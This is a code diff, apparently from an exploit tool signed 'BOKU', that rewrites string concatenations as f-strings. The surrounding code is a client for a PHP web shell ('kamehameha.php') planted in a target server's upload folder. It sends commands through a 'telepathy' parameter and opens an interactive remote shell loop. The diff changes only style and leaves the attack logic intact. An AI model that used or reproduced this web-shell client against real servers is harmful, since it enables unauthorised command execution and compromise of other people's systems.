@@ -40,16 +40,16 @@ requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.
 
 def webshell(SERVER_URL, session):
 
-    WEB_SHELL = SERVER_URL+'upload/kamehameha.php'
+    WEB_SHELL = f'{SERVER_URL}upload/kamehameha.php'
     getdir  = {'telepathy': 'echo %CD%'}
     r2 = session.get(WEB_SHELL, params=getdir, verify=False)
     status = r2.status_code
     if status != 200:
         print(Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL)
         r2.raise_for_status()
-    print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
+    print(f'{Fore.GREEN}[+] {Fore.RESET}Successfully connected to webshell.')
     cwd = re.findall('[CDEF].*', r2.text)
-    cwd = cwd[0]+"> "
+    cwd = f"{cwd[0]}> "
     term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
     while True:
         thought = input(term)
@@ -70,8 +70,16 @@ def header():
     RS   = Style.RESET_ALL
     FR   = Fore.RESET
     SIG  = BL+'            /\\\n'+RS
-    SIG += Fore.YELLOW+'/vvvvvvvvvvvv '+BL+'\\'+FR+'--------------------------------------,\n'
-    SIG += Fore.YELLOW+'`^^^^^^^^^^^^'+BL+' /'+FR+'============'+Fore.RED+'BOKU'+FR+'====================="\n'
+    SIG += (
+        f'{Fore.YELLOW}/vvvvvvvvvvvv {BL}'
+        + '\\'
+        + FR
+        + '--------------------------------------,\n'
+    )
+    SIG += (
+        f'{Fore.YELLOW}`^^^^^^^^^^^^{BL} /{FR}============{Fore.RED}BOKU{FR}'
+        + '====================="\n'
+    )
     SIG += BL+'            \/'+RS+'\n'
     return SIG
 
